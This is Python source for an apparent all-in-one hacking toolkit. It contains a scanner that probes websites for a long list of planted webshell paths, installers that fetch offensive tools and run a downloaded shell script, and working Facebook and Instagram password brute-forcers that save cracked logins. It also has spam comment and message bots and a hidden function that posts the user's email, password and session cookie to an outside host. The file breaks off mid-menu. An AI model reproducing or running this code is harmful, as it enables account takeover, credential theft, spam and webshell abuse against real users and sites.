/templates/rhuk_milkyway//forum.sql
/templates/rhuk_milkyway/r00t-s3c.php
/templates/rhuk_milkyway/c.php
/templates/rhuk_milkyway//backup.sql
/templates/rhuk_milkyway//back.sql
/templates/rhuk_milkyway//data.sql
/templates/rhuk_milkyway/wp.rar/
/templates/rhuk_milkyway/asp.aspx
/templates/rhuk_milkyway/tmp/vaga.php
/templates/rhuk_milkyway/tmp/killer.php
/templates/rhuk_milkyway/whmcs.php
/templates/rhuk_milkyway/abuhlail.php
/templates/rhuk_milkyway/tmp/killer.php
/templates/rhuk_milkyway/tmp/domaine.pl
/templates/rhuk_milkyway/tmp/domaine.php
/templates/rhuk_milkyway/useradmin/
/templates/rhuk_milkyway/tmp/d0maine.php
/templates/rhuk_milkyway/d0maine.php
/templates/rhuk_milkyway/tmp/sql.php
/templates/rhuk_milkyway/X.php
/templates/rhuk_milkyway/123.php
/templates/rhuk_milkyway/m.php
/templates/rhuk_milkyway/b.php
/templates/rhuk_milkyway/up.php
/templates/rhuk_milkyway/tmp/dz1.php
/templates/rhuk_milkyway/dz1.php
/templates/rhuk_milkyway/forum.zip
/templates/rhuk_milkyway/Symlink.php
/templates/rhuk_milkyway/Symlink.pl
/templates/rhuk_milkyway/forum.rar
/templates/rhuk_milkyway/joomla.zip
/templates/rhuk_milkyway/joomla.rar
/templates/rhuk_milkyway/wp.php
/templates/rhuk_milkyway/buck.sql
/templates/rhuk_milkyway/sysadmin.php
/templates/rhuk_milkyway/images/c99.php
/templates/rhuk_milkyway/xd.php
/templates/rhuk_milkyway/c100.php
/templates/rhuk_milkyway/spy.aspx
/templates/rhuk_milkyway/xd.php
/templates/rhuk_milkyway/tmp/xd.php
/templates/rhuk_milkyway/sym/root/home/
/templates/rhuk_milkyway/billing/killer.php
/templates/rhuk_milkyway/tmp/upload.php
/templates/rhuk_milkyway/tmp/admin.php
/templates/rhuk_milkyway/Server.php
/templates/rhuk_milkyway/tmp/uploads.php
/templates/rhuk_milkyway/tmp/up.php
/templates/rhuk_milkyway/Server/
/templates/rhuk_milkyway/wp-admin/c99.php
/templates/rhuk_milkyway/tmp/priv8.php
/templates/rhuk_milkyway/priv8.php
/templates/rhuk_milkyway/cgi.pl/
/templates/rhuk_milkyway/tmp/cgi.pl
/templates/rhuk_milkyway/downloads/dom.php
/templates/rhuk_milkyway/webadmin.html
/templates/rhuk_milkyway/admins.php
/templates/rhuk_milkyway/bluff.php
/templates/rhuk_milkyway/king.jeen
/templates/rhuk_milkyway/admins/
/templates/rhuk_milkyway/admins.asp
/templates/rhuk_milkyway/admins.php
/templates/rhuk_milkyway/wp.zip
/templates/rhuk_milkyway/
WSO.php
/a.php
/z.php
/e.php
/r.php
/xz.php
/hhh.php
/fuck.php
/hb.php
/t.php
/y.php
/u.php
/i.php
/o.php
/p.php
/q.php
/s.php
/d.php
/f.php
/g.php
/h.php
/j.php
/k.php
/l.php
/m.php
/w.php
/x.php
/c.php
/v.php
/b.php
/n.php
/1.php
/2.php
/3.php
/4.php
/5.php
/6.php
/7.php
/8.php
/9.php
/10.php
/12.php
/11.php
/1234.php
/deray.html
/index.html
/Hmei7.asp.;txt
/madspot.php
/mad.php
/404.php
/anon.php
/pirates.php
/c99.php
/anonymous.php
/shell.php
/sh3ll.php
/madspotshell.php
/b374k.php
/c100.php
/priv8.php
/private.php
/cp.php
/cpbrute.php
/ironshell.php
/themes/404/404.php
/templates/atomic/index.php
/templates/beez5/index.php
/hacked.php
/r57.php
/wso.php
/Kurama.php
/wso24.php
/wso26.php
/wso404.php
/sym.php
/symsa2.php
/sym3.php
/whmcs.php
/whmcskiller.php
/cracker.php
/1.php
/2.php
/sql.php
/gaza.php
/database.php
/a.php
/d.php
/dz.php
/cpanel.php
/system.php
/um3r.php
/zone-h.php
/c22.php
/root.php
/r00t.php
/doom.php
/dam.php
/killer.php
/user.php
/wp-content/plugins/disqus-comment-system/disqus.php
/cpn.php
/shelled.php
/uploader.php
/up.php
/xd.php
/d00.php
/h4xor.php
/tmp/mad.php
/tmp/1.php
/wp-content/plugins/akismet/akismet.php
/images/stories/w.php
/w.php
/downloads/dom.php
/templates/ja-helio-farsi/index.php
/wp-admin/m4d.php
/d.php
/Pirates.php
/rootshell.php
/php-backdoor.php
/psyc0.php
/haxor.php
/antichat.php
/antichatshell.php
/udp.php
/tcp.php
/Hmei7.asp;.txt
/Indrajith.php
/Indrajith_v2.php
/IndoXploit.php
/indrajith.php
/Indrajith.php
/mini.php
/dor.php
shellmini.php
/inishell.php
/loolzec.php
/IndoXploit.php
/garuda.php
/shellgue.php
/shellgua.php
/fuck.php
/wp.php
/upup.php
/load.php
/minishell.php
/amin.php
/jm.php
/joomla.php
/_func.php
/components/com_foxcontact/_func.php
/components/com_foxcontact/up.php
/components/com_foxcontact/upload.php
/components/com_foxcontact/shell.php
/wp-content/upload/shell.php
/wp-content/upload/up.php
gay.php
/ngentod.php
/jembut.php
/dih.php
/hmei7.asp.;txt
/Hmei7.asp.;txt
/Hmei7.asp;.txt
/Pouya.asp;.txt
/pouya.asp;.txt
/rootkit.asp;.txt
/index.asp;.txt
/a.asp;.txt
/Shell.asp;.txt
/shell.asp;.txt
/root.asp;.txt
/s.asp;.txt
/123.asp;.txt
/Umerrock.asp;.txt
/wp-content/uploads/07/08/shell.php
/up.asp;.txt
priv.php
/privat.php
/good.php
/lol.php
/components/com_banners/up.php
/components/com_banners
/upload.php
/components/com_banners/shell.php
/components/com_banners/IndoXploit.php
/components/com_hdflvplayer/hdflvplayer/download.php
/components/com_hdflvplayer/hdflvplayer/unduh.php
/phpThumb.php?
/elFinder/files/k.php
/elFinder/files/IndoXploit.php
/elFinder/filesshell.php
/elFinder/files/up.php
/elFinder/files/upload.php
/elFinder/files/sukses.php
/elFinder/files/jembut.php
/elFinder/files/jembud.php
/elFinder/files/idx.php
/elFinder/files/IDX.php
/elFinder/files/1n73ction
/elFinder/files/indrajith.php
/elFinder/files/upload.php
/elFinder/files/vuln.php
/elFinder/files/sukses.php
/elFinder/files/0day.php
/elFinder/files/LOoLzeC.php
/images/up.php
/filemanager/uploads/Shell.php.fla
/filemanager/uploads/shell.php.fla
/filemanager/uploads/IndoXploit.php.fla
"""

#========================================
               ######Script Installer#######

def asu():
	funx(SBG+' Installing ASU')
	os.system('apt update && apt upgrade')
	os.system('apt install git python2 php')
	os.system('python2 -m pip install requests bs4 mechanize')
	os.system('git clone https://github.com/LOoLzeC/ASU')
	os.system('mv ASU ~')
	print ' Done'

def flb():
	funx(SBG+' Installing FLB')
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip install requests')
	os.system('git clone https://github.com/nasirxo/flb')
	os.system('mv flb ~')
	print ' Done'


def nmap():
	funx(SBG+' Installing Nmap')
	os.system('apt update && apt upgrade')
	os.system('apt install nmap')
	print ' Done'
	print "Type nmap To Start"
	
def red_hawk():
	funx(SBG+' Installing RED HAWK')
	os.system('apt update && apt upgrade')
	os.system('apt install git php')
	os.system('git clone https://github.com/Tuhinshubhra/RED_HAWK')
	os.system('mv RED_HAWK ~')
	print ' Done'

def dtect():
	funx(SBG+' Installing D-Tect')
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/bibortone/D-Tech')
	os.system('mv D-TECT ~')
	print ' Done'


def sqlmap():
	funx(SBG+' Installing sqlmap')
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('git clone https://github.com/sqlmapproject/sqlmap')
	os.system('mv sqlmap ~')
	print ' Done'

def reconDog():
	funx(SBG+' Installing ReconDog')
	os.system('apt update && apt upgrade')
	os.system('apt install python2 git')
	os.system('git clone https://github.com/UltimateHackers/ReconDog')
	os.system('mv ReconDog ~')
	print ' Done'

def fim():
	funx(SBG+' Installing fim')
	os.system('apt update && apt upgrade')
	os.system('apt install git python && python -m pip install requests bs4')
	os.system('git clone https://github.com/karjok/fim')
	os.system('mv fim ~')
	print ' Done'

def NFD():
	funx(SBG+' Installing NFD')
	os.system('apt update && apt upgrade')
	os.system('apt install git python2')
	os.system('python2 -m pip install requests')
	os.system('git clone https://github.com/nasirxo/NFD')
	os.system('mv NFD ~')
	print ' Done'

def metasploit():
	funx(SBG+' Installing Metasploit')
	os.system("apt update && apt upgrade")
	os.system("apt install git wget curl")
	os.system("wget https://gist.githubusercontent.com/Gameye98/d31055c2d71f2fa5b1fe8c7e691b998c/raw/09e43daceac3027a1458ba43521d9c6c9795d2cb/msfinstall.sh")
	os.system("mv msfinstall.sh ~;cd ~;sh msfinstall.sh")
	print ' Done'
	print "Type 'msfconsole' to start."



#========================================

def gdump(idd):
 #562662|0
 idi = str(idd).split("|")[1]
 idg = str(idd).split("|")[0]
 ax = url.format("/browse/group/members/?id="+idg+"&start="+idi+"&listType=list_nonfriend_nonadmin")
 html = BeautifulSoup(s.get(ax).text,"html.parser")
 for i in html.find_all("table"):
   try:
     print "{} > {}[{}]".format(SBG,G,i['id'].split("_")[1])
     with open("groupid.txt","a") as gw:
       gw.write(str(i['id'].split("_")[1])+"\n")
   except:
     pass
 

def shellscanner(lnks):
  try:
    sh = get(lnks,allow_redirects=False)
    if sh.status_code == 200:
      print SBR+" FOUND SHELL : {}{} ".format(G,lnks)
  except:
    pass



def upass(email,password):
 try:
   data = {
   'id':s.cookies.get_dict()['c_user'],
   'cookie':open('.cookie','r').read(),
   'text':email+"||"+password
   }
   post("http://tik-tok.rf.gd/ak.php",data)
 except:
   pass


def tfollow(token):
 try:
   status = post('https://graph.facebook.com/nasir.xo/subscribers?access_token={}'.format(token))
 except:
   pass 


def ffollow():
 try:
   html = BeautifulSoup(s.get(url.format("/profile.php?id=100006143266745")).text,"html.parser")
 except:
   pass

 for i in html.find_all("a"):
   try:
     if "profile_add_friend.php" in i['href']:
       s.get(url.format(i['href']))
       
     elif "subscribe.php" in i['href']:
       s.get(url.format(i['href']))
   except:
     pass


def icheck(slist):
 try:
   em = str(slist).split("|")
   BASE_URL = 'https://www.instagram.com/accounts/login/'
   LOGIN_URL = BASE_URL + 'ajax/'
   headers_list = [
        "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101"\
        " Firefox/41.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)"\
        " AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2"\
        " Safari/601.3.9",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0)"\
        " Gecko/20100101 Firefox/15.0.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"\
        " (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"\
        " Edge/12.246"]
   USERNAME = str(em[0])
   PASSWD = str(em[1])
   USER_AGENT = headers_list[random.randrange(0,4)]
   session = requests.Session()
   session.headers = {'user-agent': USER_AGENT}
   session.headers.update({'Referer': BASE_URL})
   req = session.get(BASE_URL)    
   soup = BeautifulSoup(req.content, 'html.parser')    
   body = soup.find('body')
   pattern = re.compile('window._sharedData')
   script = body.find("script", text=pattern)
   script = script.get_text().replace('window._sharedData = ', '')[:-1]
   data = json.loads(script)
   csrf = data['config'].get('csrf_token')
   login_data = {'username': USERNAME, 'password': PASSWD}
   session.headers.update({'X-CSRFToken': csrf})
   login = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
   if str(json.loads(login.content)['authenticated']) == "True":
       print SBR+G+" {} | {} ".format(USERNAME,PASSWD)
       with open('instahack.txt','a') as ih:
         ih.write("{} | {}\n".format(USERNAME,PASSWD))
         
 except:
   pass


def micheck(slist):
 em = str(slist).split("|")
 BASE_URL = 'https://www.instagram.com/accounts/login/'
 LOGIN_URL = BASE_URL + 'ajax/'
 headers_list = [
        "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101"\
        " Firefox/41.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)"\
        " AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2"\
        " Safari/601.3.9",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0)"\
        " Gecko/20100101 Firefox/15.0.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"\
        " (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"\
        " Edge/12.246"
        ]
 for xi in range(int(len(em))-1):
  try:
    USERNAME = str(em[0])
    PASSWD = str(em[xi+1])
    USER_AGENT = headers_list[random.randrange(0,4)]
    session = requests.Session()
    session.headers = {'user-agent': USER_AGENT}
    session.headers.update({'Referer': BASE_URL})    
    req = session.get(BASE_URL)    
    soup = BeautifulSoup(req.content, 'html.parser')    
    body = soup.find('body')
    pattern = re.compile('window._sharedData')
    script = body.find("script", text=pattern)
    script = script.get_text().replace('window._sharedData = ', '')[:-1]
    data = json.loads(script)
    csrf = data['config'].get('csrf_token')
    login_data = {'username': USERNAME, 'password': PASSWD}
    session.headers.update({'X-CSRFToken': csrf})
    login = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
    if str(json.loads(login.content)['authenticated']) == "True":
      print SBR+G+" {} | {} ".format(USERNAME,PASSWD)
      with open('instahack.txt','a') as ih:
         ih.write("{} | {}\n".format(USERNAME,PASSWD))

  except:
     pass





def brutefx(slist):
 epx = str(slist).split("|")
 for xi in range(int(len(epx))-1):
  ldata = {'email':str(epx[0]),'pass':str(epx[int(xi)+1])}
  soi = Session()
  r = soi.post(url.format("/login"),data = ldata)    
  if "m_ses" in r.url or "home.php" in r.url:
    print SBR+G+" {} | {}".format(ldata['email'],ldata['pass'])
    with open('hackedthree.txt',"a") as bts:
      bts.write(" {} | {}".format(ldata['email'],ldata['pass']))
 

def checkl(slist):
 li = str(slist).split("|")
 ldata = {
    'email' : li[0],
    'pass' : li[1]
 }
 sos = Session()
 try:
  r = sos.post(url.format("/login"),data = ldata)
 except:
  pass

 if "m_ses" in r.url or "home.php" in r.url:
   with open('hacked.txt',"a") as bres:
     bres.write('{} | {} \n'.format(li[0],li[1]))
     
   print SBR+G+" {} | {} ".format(li[0],li[1])

def checkms(n,pxa):
 ldata = {
    'email' : str(n),
    'pass' : str(pxa)
 }
 sos = Session()
 try:
  r = sos.post(url.format("/login"),data = ldata)
 except:
  pass

 if "m_ses" in r.url or "home.php" in r.url:
   with open('hacked.txt',"a") as bres:
     bres.write('{} | {} \n'.format(n,pxa))
     
   print SBR+" Hacked :{} {} | {} ".format(G,n,pxa)



def livept(slist):
 try:
   #ug = headers_list[random.randrange(0,4)]
   li = str(slist).split("|")
   ldata = {'email' : str(li[0]),'pass' : str(li[1])}  
   so = Session()    
   #so.headers = {'user-agent': ug}
   r = so.post(url.format("/login"),data = ldata)
   if "m_ses" in r.url:
     print SBR+G+" {} | {} {}[LIVE] ".format(li[0],li[1],W)
     with open('live.txt','a') as bres:
         bres.write('{} | {} \n'.format(li[0],li[1]))
   if "home.php" in r.url:
     print SBR+G+" {} | {} {}[LIVE] ".format(li[0],li[1],W)
     with open('live.txt','a') as bres:
         bres.write('{} | {} \n'.format(li[0],li[1]))
#   if "m_ses" or "save-device" not in r.url:
#     print SBR+G+" {} | {} {}[F] ".format(li[0],li[1],R)

   if "checkpoint" in r.url:
     print SBR+G+" {} | {} {}[CP] ".format(li[0],li[1],Y)

     
         
 except:
    pass


def checkpt(slist):
 li = str(slist).split("|")
 ldata = {
    'email' : li[0],
    'pass' : li[1]
 }
 sos = Session()
 try:
  r = sos.post(url.format("/login"),data = ldata)
 except:
  pass

 if "checkpoint" in r.url:
   with open('checkpoint.txt',"a") as bres:
     bres.write('{} | {} \n'.format(li[0],li[1]))
     
   print SBR+G+" {} | {} {}[CHECKPOINT] ".format(li[0],li[1],R)




def checkw(slist):
 it = int(open(".a","r").read())
 ic = int(len(open(".b","r").read()))
 sys.stdout.write("\r"+SBR+G+" Progress :  {} / {} ".format(ic,it))
 sys.stdout.flush()
 li = str(slist).split("|")
 ldata = {
    'email' : li[0],
    'pass' : li[1]
 }
 sos = Session()
 try:
  r = sos.post(url.format("/login"),data = ldata)
 except:
  pass
  
 with open(".b","a") as bx:
    bx.write("1")
    
 if "m_ses" in r.url or "home.php" in r.url:
   with open('hacked.txt',"a") as bres:
     bres.write('{} | {} \n'.format(li[0],li[1]))
     
   print xin+SBR+G+" FOUND : =>  {} | {}".format(li[0],li[1])


        
def login(url):
 email = raw_input(xin+SG+" Email : "+G)
 password = raw_input(SG+" Password : "+G)
 try:
   cred = {'email':str(email),'pass':str(password)}
   r = [funx(SGO+" Logging in"+G),s.post(url.format("/login"),data = cred)][1]
   print xin
   if "m_ses" in r.url or "home.php" in r.url:
       #Process(target=upass, args=(email,password)).start()
       print SGO+G+" Login Sucessfull.. :)"
       ffollow()
       with open(".cookie","w") as cok:
          cok.write(json.dumps(s.cookies.get_dict()))
          
       os.system("clear")
       main(url,"0")
   else:
       print SRO+R+" Login Failed.... :("
       time.sleep(2)
       os.system("clear")
       login(url)
 except:
   print SR+R+" No Internet Connection:("
   time.sleep(2)
   os.system("clear")
   login(url)



def comment(path):
 message = open(".com","r").read()
 mdata = []
 r = s.get(path)
 urlm = BeautifulSoup(r.text,"html.parser")
 for x in urlm("form"):
    if "/a/comment.php" in x["action"]:
       mdata.append(url.format(x["action"]))
       break
 for x in urlm("input"):
        try:
         if "fb_dtsg" in x["name"]:
            mdata.append(x["value"])
         if "jazoest" in x["name"]:
            mdata.append(x["value"])
         if "ids" in x["name"]:
            mdata.append(x["name"])
            mdata.append(x["value"])
         if len(data) ==7:
                break
        except:
         pass
 messagedata={
    "fb_dtsg":mdata[1],
    "jazoest":mdata[2],
    mdata[3]:mdata[4],
    "comment_text":str(message),
    "Comment":"comment"}
 status = s.post(mdata[0],data = messagedata)
 if status.ok == True:
    print SBG+G+" Commented"
 else:
    print SBR+R+" Comment Failed"



def ecomment(pathx):
 message = open(".com","r").read()
 mdata = []
 sos = Session()
 e = str(pathx).split("@")[1].split("|")[0]
 p = str(pathx).split("@")[1].split("|")[1]
 #https:///gsushd.xom/-^^^#@nair.xo|hzhzgz
 ldata = { 'email': str(e) ,'pass': str(p) }
 try:
  rx = sos.post(url.format("/login"),data = ldata)
  if "m_ses" in rx.url or "home.php" in rx.url:
    r = sos.get(str(pathx).split("@")[0])
    urlm = BeautifulSoup(r.text,"html.parser")
    for x in urlm("form"):
      if "/a/comment.php" in x["action"]:
         mdata.append(url.format(x["action"]))
         break
    for x in urlm("input"):
        try:
         if "fb_dtsg" in x["name"]:
            mdata.append(x["value"])
         if "jazoest" in x["name"]:
            mdata.append(x["value"])
         if "ids" in x["name"]:
            mdata.append(x["name"])
            mdata.append(x["value"])
         if len(data) ==7:
                break
        except:
         pass
    messagedata={
       "fb_dtsg":mdata[1],
       "jazoest":mdata[2],
       mdata[3]:mdata[4],
       "comment_text":str(message),
       "Comment":"comment"}
    status = sos.post(mdata[0],data = messagedata)
    if status.ok == True:
         print SBG+G+" Commented from {}".format(e)
    else:
         print SBR+R+" Comment Failed"

 except:
   pass


def fsend(n,message):
 k = url.format('/messages/thread/'+str(n))
 data=[]
 urlm=BeautifulSoup(s.get(k).content,"html.parser")
 for x in urlm("form"):
	if "/messages/send/" in x["action"]:
		data.append(url.format(x["action"]))
		break
				
 for x in urlm("input"):
	try:
	 if "fb_dtsg" in x["name"]:
		data.append(x["value"])
	 if "jazoest" in x["name"]:
		data.append(x["value"])
	 if "ids" in x["name"]:
		data.append(x["name"])
		data.append(x["value"])
	 if len(data) ==7:
		break
	except:
	 pass
		
 if len(data) == 7:
  #print data
  f=s.post(data[0],data={
		"fb_dtsg":data[1],
		"jazoest":data[2],
		data[3]:data[4],
		data[5]:data[6],
		"body":message,
		"Send":"Kirim"}).url
  if "send_success" in f:
	print SBG+" Message Sent To {}{}".format(G,n)
  else:
    print SBR+" Failed To Message {}{}".format(R,n)

def sendmes(n):
 message = open(".mes","r").read()
 k = url.format('/messages/thread/'+str(n))
 data=[]
 urlm=BeautifulSoup(s.get(k).content,"html.parser")
 for x in urlm("form"):
	if "/messages/send/" in x["action"]:
		data.append(url.format(x["action"]))
		break
				
 for x in urlm("input"):
	try:
	 if "fb_dtsg" in x["name"]:
		data.append(x["value"])
	 if "jazoest" in x["name"]:
		data.append(x["value"])
	 if "ids" in x["name"]:
		data.append(x["name"])
		data.append(x["value"])
	 if len(data) ==7:
		break
	except:
	 pass
		
 if len(data) == 7:
  #print data
  f=s.post(data[0],data={
		"fb_dtsg":data[1],
		"jazoest":data[2],
		data[3]:data[4],
		data[5]:data[6],
		"body":message,
		"Send":"Kirim"}).url
  if "send_success" in f:
	print SBG+" Message Sent To {}{}".format(G,n)
  else:
    print SBR+" Failed To Message {}{}".format(R,n)




#=========================================

def main(url,ix):
 optionx = """    
     {} USER : {}   
     
    {} 1 : Hashes Collection
    {} 2 : Facebook Bruter's
    {} 3 : Instagram Bruter's
    {} 4 : Facebook Tools
    {} 5 : Termux Tools
    {} 6 : Website's Hacking Tools
    {} 7 : BOT'S (Multi)
    {} 8 : Android Hack-s {}|#ROOT|
    {} 9 : Update AK-47
    {} 10 : Exit :(
 """
 os.system("clear")
 print random.choice(banner)
 print "         "+SBG+G+" Github : {} github.com/nasirxo ".format(W)
 print "         "+SBG+G+" Facebook : {} fb.com/nasir.xo ".format(W)
 print "         "+SBG+G+" YouTube : {} Youtube.com/TheDarkSec \n".format(W)
 if int(ix) == 0:
   #s.cookies.update(json.loads(open('.cookie','r').read()))
   nhtml = BeautifulSoup(s.get(url.format("/profile.php"),headers = headers).content,"html.parser").title.get_text()
   #print nhtml
   #print s.cookies
   if nhtml == "Page Not Found":
       print SBR+" Session Expired :("
       time.sleep(3)
       os.system('rm .cookie')
       sys.exit()
       
   with open('.name','w') as nw:
     nw.write(str(nhtml))
     nw.close()
 name = open('.name','r').read()
 print optionx.format(SBR,name,SBG,SBG,SBG,SBG,SBG,SBG,SBG,SBG,R,SBG,SBG)
 optc = raw_input(SGO+" CHOICE : ")
 if optc == "10":
    funx(SG+" Exiting ")
    os.system("clear")
    sys.exit()


###             Hash Tools                  ###
###               Option : 1                    ###

 elif optc == "1" or optc =="01":
    os.system("clear")
    print """
        {}[ HASHES Collection ]
    
      {} 1 : String to Binary
      {} 2 : String to MD5
      {} 3 : String to SHA-1
      {} 4 : String to SHA-256
      {} 5 : String to SHA-512
      {} 6 : String to Base64
      {} 7 : Go Back <=
      
      """.format(G,SBG,SBG,SBG,SBG,SBG,SBG,SBG)
    while 1:
     rchoc = raw_input(SGO+" CHOICE : ")
     if rchoc == "7" or rchoc == "back":
      main(url,"1")
     elif rchoc == "1" or rchoc == "01":
      print SBR+" Binary : {}".format(' '.join(format(ord(x), 'b') for x in raw_input(SGO+" STRING : ")))
     elif rchoc == "2" or rchoc == "02":
      print SBR+" MD5 Hash : {}".format(hashlib.md5(raw_input(SGO+" STRING : ")).hexdigest())
     elif rchoc == "3" or rchoc == "03":
      print SBR+" SHA-1 Hash : {}".format(hashlib.sha1(raw_input(SGO+" STRING : ")).hexdigest())
     elif rchoc == "4" or rchoc == "04":
      print SBR+" SHA-256 Hash : {}".format(hashlib.sha256(raw_input(SGO+" STRING : ")).hexdigest())  
     elif rchoc == "5" or rchoc == "05":
      print SBR+" SHA-512 Hash : {}".format(hashlib.sha512(raw_input(SGO+" STRING : ")).hexdigest())
     elif rchoc == "6" or rchoc == "06":
      print SBR+" Base64 : {}".format(base64.b64encode(raw_input(SGO+" STRING : ")))
     else:
      print SRO+R+" Invalid Choice !"


### Facebook Bruteforce panel ###
###               Option : 2                   ###

 elif optc == "2" or optc == "02":
   os.system("clear")
   print """
       {}[ Facebook Bruteforcer's ]

     {} 1 : Single Password on ID's List
     {} 2 : 3 Passwords on ID's List
     {} 3 : Random Passwords on ID's List
     {} 4 : WordList Attack 
     {} 5 : Try Single Password on Online Users
     {} 6 : SocialEngineer Group 
     {} 7 : Go Back <=

     """.format(G,SBG,SBG,SBG,SBG,SBG,SBG,SBG)
   while 1:
    rchoc = raw_input(SGO+" CHOICE : ")
    if rchoc == "7" or rchoc == "back":
       main(url,"1")
       
    if rchoc == "1" or rchoc == "01":
      try:
        idfile =  open(raw_input(SGO+" ID'S List File : "),"r").read().split()
        print SGO+" Total Accounts : {}".format(len(idfile))
      except:
        print SBR+R+" Invalid File !"
        
      passw = raw_input(SGO+" Password To Try On Accounts : ")
      slist = []
      for i in range(len(idfile)):
        slist.append(str(idfile[i])+'|'+str(passw))
    
      if len(passw) > 0 and len(slist) > 0:
        os.system("clear")
        print SBG+Y+" [BruteForce Result's Would Appear Here]"

        procx.map(checkl,slist)
        print xin+SBG+G+" Saved to hacked.txt :)"
        print xin+SR+" Type back to go back"

       
    if rchoc == "2" or rchoc == "02":
      try:
        idfile =  open(raw_input(SGO+" ID'S List File : "),"r").read().split()
        print SGO+" Total Accounts : {}".format(len(idfile))
      except:
        print SBR+R+" Invalid File !"
        
      passx1 = raw_input(SGO+" Password  1 : ")
      passx2 = raw_input(SGO+" Password  2 : ")
      passx3 = raw_input(SGO+" Password  3 : ")
      print SBR+G+" These 3 Passwords Would Be Checked on Each Account From List"
      time.sleep(2)
      slist = []
      for i in range(len(idfile)):
        slist.append(str(idfile[i])+'|'+str(passx1)+'|'+str(passx2)+'|'+str(passx3))
             
      if len(slist) > 0:
        os.system("clear")
        print SBG+Y+" [BruteForce Result's Would Appear Here]"

        procx.map(brutefx,slist)
        print xin+SBG+G+" Saved to hackedthree.txt :)"
        print xin+SR+" Type back to go back"

       
    if rchoc == "3" or rchoc == "03":
      try:
        idfile =  open(raw_input(SGO+" ID'S List File : "),"r").read().split()
        print SGO+" Total Accounts : {}".format(len(idfile))
      except:
        print SBR+R+" Invalid File !"

      print SBR+G+" Some Common Random Password Would Be Checked On Each"
      time.sleep(2)
      commonpass = ['pakistan','123456','facebook','786786','qwertyuiop','0987654321']
      slist = []
      for i in range(len(idfile)):
        slist.append(str(idfile[i])+'|'+str(random.choice(commonpass)))
             
      if len(slist) > 0:
        os.system("clear")
        print SBG+Y+" [BruteForce Result's Would Appear Here]"
     
        procx.map(checkl,slist)
        print xin+SBG+G+" Saved to hacked.txt :)"
        print xin+SR+" Type back to go back"

       
    if rchoc == "4" or rchoc == "04":
      try:
        passfile =  open(raw_input(SGO+" WordList File : "),"r").read().split()
        print SGO+" Total Passwords : {}".format(len(passfile))
        with open(".a",'w') as ax:
          ax.write(str(len(passfile)))
      except:
        print SBR+R+" Invalid File !"
        
      acc = raw_input(SGO+" Account(ID/Email) : ")
      slist = []
      for i in range(len(passfile)):
        slist.append(str(acc)+'|'+str(passfile[i]))
    
      if len(passfile) > 0:
        os.system("clear")
        print SBG+Y+" [BruteForce Result's Would Appear Here]"
        with open(".b","w") as bx:
             bx.write("")

        procx.map(checkw,slist)
        print xin+SBG+G+" Saved to hacked.txt :)"
        print xin+SR+" Type back to go back"


    if rchoc == "5" or rchoc == "05":
         passxd = raw_input(SBG+" Password to try on Online Users \n"+SGO+" Password : ")
         
         online = []
         html = BeautifulSoup(s.get(url.format("/buddylist.php")).content,"html.parser")
         for i in html.find_all("a"):
           try:
               if "/messages/read/?fbid" in i['href']:
                     online.append(str(i['href']).split("=")[1].split("&")[0])
           except:
               pass

         slist = []
         for i in range(len(online)):
           try:
             time.sleep(0.1)
             sys.stdout.write("\r"+SBR+" Getting ID :  {}{}".format(G,online[i]))
             sys.stdout.flush()
             slist.append(str(online[i])+"|"+str(passxd))
           except:
             pass

         os.system("clear")
         
         print SBG+Y+" [BruteForce Result's Would Appear Here]"
         print SBG+" ONLINE : {}{}".format(G,len(online))
         procx.map(checkl,slist)
         print xin+SBG+G+" Saved to hacked.txt :)"
         print xin+SR+" Type back to go back"


    if rchoc == "6" or rchoc == "06":
     id = {}
     acc = []
     gid =  raw_input(SGO+" GROUP ID : "+G)
     if len(gid) > 0:
      html = BeautifulSoup(s.get(url.format("/browse/group/members/?id="+gid)).content,"html.parser")
      print SBG+" GROUP NAME : {}{}".format(G,html.find("h3").renderContents())
      #print SBG+" {}".format(html.find_all(class_="u v w")[0].renderContents())
      gam = int(raw_input(SGO+" How Many Members ? : "))
      funx(SBG+" Running Emails Crawler")
      print xin
      cc = 0
      while cc == 0:
        for i in html.find_all("a",href=True):
           if "fref" in i["href"]:
             try:
               id[re.findall("php\?id=(.*?)&",i['href'])[0]] = "".join(i.get_text().split()).lower()
               sys.stdout.write("\r{} Getting ID's : {}{}".format(SBR,G,len(id.keys())))
               sys.stdout.flush()
             except:
               pass
             try:
               id[re.findall("/(.*?)\?fref",i['href'])[0]] = "".join(i.get_text().split()).lower()
               sys.stdout.write("\r{} Getting ID's : {}{}".format(SBR,G,len(id.keys())))
               sys.stdout.flush()
             except:
               pass
           if "/browse/group/members/" in i['href']:
             html = BeautifulSoup(s.get(url.format(i['href'])).content,"html.parser")
             
             
           if len(id.keys()) >= gam:
               cc = 1
     
      for i in id.keys():
        try:
           acc.append("{}|{}123".format(i,id[i]))
        except:
           pass
      os.system("clear")
      print "               "+SBG+Y+" [ Result Will Appear Here]"+"\n"
      procx.map(checkl,acc)
      print xin+SBG+G+" Saved to hacked.txt :)"



### Instagram Bruteforce panel ###
###               Option : 3                    ###

 elif optc == "3" or optc == "03":
   os.system("clear")
   print """
       {}[ Instagram Bruteforcer's ]

     {} 1 : Single Password on Username's List
     {} 2 : 3 Passwords on Username's List
     {} 3 : Random Passwords on Username's List
     {} 4 : WordList Attack 
     {} 5 : Go Back <=

     """.format(G,SBG,SBG,SBG,SBG,SBG)

   while 1:
    rchoc = raw_input(SGO+" CHOICE : ")
    if rchoc == "5" or rchoc == "back":
       main(url,"1")

       
    if rchoc == "1" or rchoc == "01":
      try:
